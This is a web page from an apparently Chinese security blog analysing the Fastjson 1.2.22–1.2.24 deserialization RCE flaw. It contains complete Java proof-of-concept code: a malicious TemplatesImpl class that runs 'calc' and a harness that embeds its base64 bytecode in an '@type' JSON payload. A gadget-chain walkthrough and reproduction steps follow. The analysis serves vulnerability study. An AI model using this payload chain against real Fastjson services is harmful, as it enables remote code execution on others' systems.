@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Fastjson 1.2.22 - 1.2.24 反序列化漏洞一、漏洞简介二、漏洞影响Fastjson 1.2.22-24 三、复现过程0x01 简单介绍 介绍：FastJson是一款由阿里开发的JSON库&gt; 影响版本：1.2.22-24&gt; 官方通告：https:&#x2F;&#x2F;github.com&#x2F;alibaba&#x2F;fastjson&#x2F;wiki&#x2F;security\_update\_20170315&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Fastjson 1.2.22 - 1.2.24 反序列化漏洞一、漏洞简介二、漏洞影响Fastjson 1.2.22-24 三、复现过程0x01 简单介绍 介绍：FastJson是一款由阿里开发的JSON库&gt; 影响版本：1.2.22-24&gt; 官方通告：https:&#x2F;&#x2F;github.com&#x2F;alibaba&#x2F;fastjson&#x2F;wiki&#x2F;security\_update\_20170315&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId30.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId32.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId34.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId35.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId36.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId37.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId39.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId40.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId41.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId42.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId43.png">
+<meta property="article:published_time" content="2022-07-08T06:25:56.492Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.674Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId26.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Fastjson/Fastjson 1.2.22 - 1.2.24 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.492Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Fastjson-1-2-22-1-2-24-反序列化漏洞"><a href="#Fastjson-1-2-22-1-2-24-反序列化漏洞" class="headerlink" title="Fastjson 1.2.22 - 1.2.24 反序列化漏洞"></a>Fastjson 1.2.22 - 1.2.24 反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fastjson 1.2.22-24</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="0x01-简单介绍"><a href="#0x01-简单介绍" class="headerlink" title="0x01 简单介绍"></a>0x01 简单介绍</h3><blockquote>
+<p>介绍：FastJson是一款由阿里开发的JSON库&gt; 影响版本：1.2.22-24&gt; 官方通告：<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/security/_update/_20170315&gt;">https://github.com/alibaba/fastjson/wiki/security\_update\_20170315&gt;</a> 补丁：<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/commit/d075721cf396d5cb70e24c824b901e3a9a5b342b">https://github.com/alibaba/fastjson/commit/d075721cf396d5cb70e24c824b901e3a9a5b342b</a></p>
+<p>本地环境：&gt; win10&gt; idea64 2018.2.5&gt; jdk 1.8&gt; fastjson 1.22</p>
+</blockquote>
+<h4 id="FastJson的简单使用"><a href="#FastJson的简单使用" class="headerlink" title="FastJson的简单使用"></a>FastJson的简单使用</h4><p>先通过一个简单的demo来熟悉一下FastJson的基本操作。首先创建一个Student类，Student.java：</p>
+<pre><code>package ka1n4t.test;
+
+public class Student &#123;
+    public String name;
+    private int age;
+
+    public String getName() &#123;
+        return name;
+    &#125;
+
+    public void setName(String name) &#123;
+        this.name = name;
+    &#125;
+
+    public int getAge() &#123;
+        return age;
+    &#125;
+
+    public void setAge(int age) &#123;
+        this.age = age;
+    &#125;
+&#125;
+</code></pre>
+<p>Students有一个公有属性name和一个私有属性age。下面使用一个测试类，将json字符串反序列化成Student对象，learnFJ.java：</p>
+<pre><code>package ka1n4t.test;
+
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+import com.alibaba.fastjson.JSONObject;
+
+public class learnFJ &#123;
+    public static void main(String args[]) &#123;
+        String text = &quot;&#123;\&quot;@type\&quot;:\&quot;ka1n4t.test.Student\&quot;,\&quot;name\&quot;:\&quot;ZhangSan\&quot;,\&quot;age\&quot;:123&#125;&quot;;
+        Student obj1 = JSON.parseObject(text, Student.class, Feature.SupportNonPublicField);
+        System.out.println(obj1.getName());
+    &#125;
+&#125;
+</code></pre>
+<p>结果：</p>
+<p><img src="/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<h3 id="0x02-原理分析"><a href="#0x02-原理分析" class="headerlink" title="0x02 原理分析"></a>0x02 原理分析</h3><h4 id="分析POC"><a href="#分析POC" class="headerlink" title="分析POC"></a>分析POC</h4><p>先看一下用于反序列化的恶意类evilClass1.java:</p>
+<pre><code>package ka1n4t.poc;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+import java.io.IOException;
+
+public class evilClass1 extends AbstractTranslet/*ka1n4t*/ &#123;
+
+
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;
+    &#125;
+
+
+    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;
+
+    &#125;
+
+    public evilClass1() throws IOException &#123;
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    &#125;
+
+    public static void main(String[] args) throws IOException &#123;
+        evilClass1 helloworld = new evilClass1();
+    &#125;
+&#125;
+</code></pre>
+<p>其中的构造方法是用exec弹个计算器。看下poc，vulApp1.java：</p>
+<pre><code>package ka1n4t.poc;
+
+import org.apache.commons.io.IOUtils;
+import org.apache.commons.codec.binary.Base64;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+import com.alibaba.fastjson.parser.ParserConfig;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+
+public class vulApp1 &#123;
+
+    public static String readClass(String cls)&#123;
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        try &#123;
+            IOUtils.copy(new FileInputStream(new File(cls)), bos);
+        &#125; catch (IOException e) &#123;
+            e.printStackTrace();
+        &#125;
+
+        String result = Base64.encodeBase64String(bos.toByteArray());
+
+        return result;
+    &#125;
+
+    public static void bad_method() &#123;
+        ParserConfig config = new ParserConfig();
+        final String fileSeparator = System.getProperty(&quot;file.separator&quot;);
+        String evil_path = &quot;D:\\Java-App\\fastjson-1.2.22\\target\\classes\\ka1n4t\\poc\\evilClass1.class&quot;;
+        String evil_code = readClass(evil_path);
+
+        final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
+
+        String text1 = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +
+                &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evil_code+&quot;\&quot;],&quot; +
+                &quot;&#39;_name&#39;:&#39;a.b&#39;,&quot; +
+                &quot;&#39;_tfactory&#39;:&#123; &#125;,&quot; +
+                &quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;\n&quot;;
+        System.out.println(text1);
+        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
+    &#125;
+
+    public static void main(String args[]) &#123;
+        bad_method();
+    &#125;
+
+&#125;
+</code></pre>
+<p>核心部分：</p>
+<pre><code>String text1 = &quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +
+                &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evil_code+&quot;\&quot;],&quot; +
+                &quot;&#39;_name&#39;:&#39;a.b&#39;,&quot; +
+                &quot;&#39;_tfactory&#39;:&#123; &#125;,&quot; +
+                &quot;\&quot;_outputProperties\&quot;:&#123; &#125;&#125;\n&quot;;
+
+Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
+</code></pre>
+<p>_bytecodes是经过base64编码的evilClass1的字节码文件，NASTY_CLASS是TemplatesImpl类。总结一下这个payload，利用JSON.parseObject反序列化TemplatesImpl类，其中_bytecodes属性是经过base64编码的恶意类字节码文件。</p>
+<h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>下面来分析一下反序列化TemplatesImpl的调用链，首先经过java的反射机制，到达TemplatesImpl类，调用其getOutputProperties()方法：</p>
+<p><img src="/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
+<p><img src="/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
+<p>跟进newTransformer()方法，这个方法是用于创建一个Transformer实例。然后到达getTransletInstance()方法：</p>
+<p><img src="/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
+<p>getTransletInstance()方法用于创建一个translet实例，返回这个translet给newTransformer()，然后被包裹成Transformer对象。跟进一下这个方法，发现其调用了defineTransletClasses()用来加载_bytecodes中的类，接着又调用了_class[_transletIndex].newInstance()将defineTransletClasses()返回的类进行实例化：</p>
+<p><img src="/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
+<p>先跟进一下defineTransletClasses方法：</p>
+<p><img src="/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId34.png"></p>
+<p>可以看到，使用了loader.defineClass()方法用于加载_bytecodes的内容，并将返回的类赋值给_class[i]（这里的i是0）。loader是TemplatesImpl自定义的类，跟进一下：</p>
+<p><img src="/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
+<p>可以看到TransletClassLoader继承了Java类加载器—ClassLoader类，跟进其defineClass方法，发现直接调用了父类ClassLoader中的方法，所以就不再跟进了。</p>
+<p>回到defineTransletClasses方法，其间接调用ClassLoader加载_bytecodes中的内容之后，将加载出来的类赋值给_class[0]，然后结束，回到getTransletInstance方法，再看一下图：</p>
+<p><img src="/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
+<p>可以看到，455行直接使用了_class[0].newInstance()创建实例，创建的过程中调用了evilClass1构造方法，然后触发了payload：</p>
+<p><img src="/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId37.png"></p>
+<h3 id="0x03-复现过程"><a href="#0x03-复现过程" class="headerlink" title="0x03 复现过程"></a>0x03 复现过程</h3><p>从github上直接pull下poc：<a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/fastjson-remote-code-execute-poc">https://github.com/ianxtianxt/fastjson-remote-code-execute-poc</a><br>使用idea打开工程，编译test.java：</p>
+<p><img src="/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId39.png"></p>
+<p>然后会在target/classes/person下生成test.class文件。用同样的方法编译Poc.java。</p>
+<p><img src="/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId40.png"></p>
+<p>配置运行方式</p>
+<p><img src="/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId41.png"></p>
+<p>image</p>
+<p>运行Poc：</p>
+<p><img src="/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId42.png"></p>
+<p><img src="/resource/Fastjson1.2.22-1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId43.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/9986427.html">https://www.cnblogs.com/litlife/p/9986427.html</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qp4h0075y8v16bkpbcyv" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Fastjson/Fastjson%201.2.68%20bypass%20autotype/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/FasterXML%20jackson/%EF%BC%88CVE-2020-8840%EF%BC%89FasterXML%20jackson-databind%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
